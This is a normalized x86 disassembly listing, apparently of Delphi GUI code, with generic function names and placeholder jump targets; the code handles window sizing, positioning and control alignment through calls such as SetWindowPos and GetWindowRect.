jns r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebx + 0x188 ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_474a00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] eax
mov eax [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + 0x1bc ]
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
sub [ esi ] edx
mov eax [ ebx + 0x1bc ]
mov edx [ eax + 0xc ]
add edx [ eax + 0x14 ]
sub [ esi + 0x4 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_474a68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
movzx edx [ ebp - 0x5 ]
cmp edx 0x6
ja r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
jmp [ edx * 4 + jump_table_474a8e ]
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebx eax
setl al
jmp r-xdata
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebx eax
cmp esi ebx
setge al
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebx eax
setl al
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebx eax
cmp esi ebx
setge al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0xb8 ]
sub_474b98
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov esi eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ esi + 0x34 ]
call sub_474a00
lea ecx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4745d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_474be0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_475884
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5d ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x59 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4303e0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4305a0
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_474b98
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_475848
mov edi eax
cmp bl [ edi + 0x5d ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
cmp [ edi + 0x59 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
xor esi esi
jmp r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_430658
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4305a0
mov edx eax
mov ecx ebx
mov eax edi
call sub_474a68
pop ecx
test al al
je r-xdata
inc esi
sub_474d6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_475884
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_475848
cmp [ eax + 0x5d ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_475848
movzx edx [ r-xdata ]
cmp dl [ eax + 0x63 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_474dc0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47502a
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x8 ] eax
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
xor ecx ecx
push ebp
push sub_475007
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x1a8 ] eax
xor ecx ecx
push ebp
push sub_474faf
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor edx edx
push ebp
push sub_474f72
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1a8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov [ ecx + 0x1a8 ] edx
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
retn
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1a8 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x1a8 ] eax
xor eax eax
push ebp
push sub_474ede
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_47539c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474ee5
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
cmp [ eax + edx * 4 ] 0xa
jge r-xdata
retn
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x1a8 ] edx
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_4305a0
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_430608
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xffffffff
je r-xdata
sub_474ee5
cmp [ ebp - 0x14 ] 0xffffffff
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4303e0
mov eax [ ebp - 0x4 ]
call sub_408754
mov edx [ ebp - 0x8 ]
mov ebx [ edx + 0xc ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
inc [ eax + edx * 4 ]
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
push ebx
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_4305a0
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_430608
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1a8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov [ ecx + 0x1a8 ] edx
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1a8 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x1a8 ] eax
xor eax eax
push ebp
push sub_474ede
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_47539c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474ee5
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
cmp [ eax + edx * 4 ] 0xa
jge r-xdata
retn
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x1a8 ] edx
sub_474fb6
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47500e
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
mov [ ebp - 0x10 ] eax
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0xc ]
mov si 0xffd0
call sub_40587c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4305a0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x1
jne r-xdata
sub_475038
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
call sub_479ce0
push eax
call IsZoomed
test eax eax
je r-xdata
mov eax [ esi ]
mov si 0xffef
call sub_40587c
mov eax [ esi ]
call sub_479ce0
push eax
call GetParent
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ esi ]
call sub_479ce0
push eax
call GetWindowRect
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_472e3c
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
cmp eax edx
jne r-xdata
push 0x16
mov eax [ esi ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ esi ]
call sub_479ce0
push eax
call SetWindowPos
mov edx [ esi ]
mov edx [ edx + 0x4c ]
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x14 ]
cmp edx ecx
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4c ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
call [ edx + 0x68 ]
jmp r-xdata
sub_475104
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ec ] 0x0
je r-xdata
push ebp
call sub_474d6c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1eb ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5e ] 0x0
je r-xdata
mov [ ebp - 0x15 ] 0x0
xor eax eax
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4752b8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c8 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ea ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xa0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_475249
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_474be0
pop ecx
push ebp
mov al 0x2
call sub_474be0
pop ecx
push ebp
mov al 0x3
call sub_474be0
pop ecx
push ebp
mov al 0x4
call sub_474be0
pop ecx
push ebp
mov al 0x5
call sub_474be0
pop ecx
push ebp
mov al 0x6
call sub_474be0
pop ecx
push ebp
xor eax eax
call sub_474be0
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc6
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475250
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c8 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
push ebp
call sub_475038
pop ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1a8 ] edx
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov [ ebp - 0x15 ] 0x1
mov eax [ eax + 0x1a8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a8 ] eax
jmp r-xdata
sub_475250
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ea ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push ebp
call sub_475038
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x1a8 ] edx
mov eax [ ebp - 0x14 ]
xor edx edx
mov [ ebp - 0x14 ] edx
call sub_4055f0
jmp r-xdata
push ebp
call sub_474dc0
pop ecx
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x1a8 ] edx
sub_4752e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47a060
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_475374
xor eax eax
push ebp
push sub_475366
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffffffef
mov eax [ ebp - 0x4 ]
call sub_47537c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_4753a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_475469
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47074c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_475884
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475470
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_475848
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4303e0
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_470438
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4305a0
xor ecx ecx
mov edx 0xb03e
call sub_472314
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_475848
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_475478
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_475884
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x1ac ]
xor edx edx
push ebp
push sub_475568
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_475884
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffbf
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x8 ]
test esi esi
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_475848
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4303e0
mov edx esi
dec edx
mov eax [ ebp - 0xc ]
call sub_4305a0
mov ebx eax
cmp [ ebx + 0x5d ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4055f0
mov eax [ ebp - 0x4 ]
call sub_47537c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_475848
movzx eax [ eax + 0x5d ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
mov eax ebx
call sub_470108
mov dl 0x4
mov eax ebx
call sub_470108
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_430438
sub_4755d4
push ebx
push esi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
call sub_4946a4
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_49976c
sub_4755f4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
lea eax [ esi + 0x1dc ]
mov edx ebx
call sub_46f1c0
lea eax [ esi + 0x1e0 ]
mov edx ebx
call sub_46f1c0
lea eax [ esi + 0x1d8 ]
mov edx ebx
call sub_46f1c0
jmp r-xdata
mov [ ebx + 0x34 ] esi
sub_475640
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
lea eax [ esi + 0x1dc ]
mov edx ebx
call sub_46f1e8
lea eax [ esi + 0x1d8 ]
mov edx ebx
call sub_46f1e8
lea eax [ esi + 0x1e0 ]
mov edx ebx
call sub_46f1e8
jmp r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop esi
pop ebx
retn
sub_475688
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40587c
mov [ esp ] ebx
mov [ esp + 0x4 ] edi
push 0x1
lea ecx [ esp + 0x4 ]
mov edx 0xb04c
mov eax edi
call sub_472314
cmp edi [ esp + 0x4 ]
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_472314
mov edx ebx
mov eax edi
call sub_4755f4
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb050
mov eax ebx
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb058
mov eax ebx
call sub_472314
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax edi
call sub_47a060
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_472314
mov eax edi
call sub_4763e8
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4752e0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
sub_4757a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov [ esp ] esi
mov [ esp + 0x4 ] ebx
push 0x0
mov edi esi
mov ecx edi
mov edx 0xb036
mov eax ebx
call sub_472314
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov dl 0x1
mov ebp esi
mov eax ebp
call sub_4755d4
mov eax ebp
mov edx [ eax ]
call [ edx + 0xc0 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_475640
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax ebx
call sub_472314
push 0x0
lea ecx [ esp + 0x4 ]
mov edx 0xb04c
mov eax ebx
call sub_472314
xor edx edx
mov eax ebx
call sub_4752e0
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
movzx edx [ esi + 0x59 ]
mov eax esi
call sub_471304
sub_475848
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x1dc ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x1e0 ]
call sub_4305a0
mov edx edi
mov eax ebp
call sub_4305a0
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4758a4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_475884
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_475848
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_4758e4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_47008c
cmp esi [ edi + 0x24c ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x24c ] eax
sub_475914
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_4758a4
add esp 0x10
retn
sub_47593c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4715d0
test al al
je r-xdata
mov eax ebx
call sub_471600
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc7
call sub_40587c
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_40587c
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_40587c
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_4759a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_475aab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0xcc
call sub_404c14
mov eax [ esi + 0x174 ]
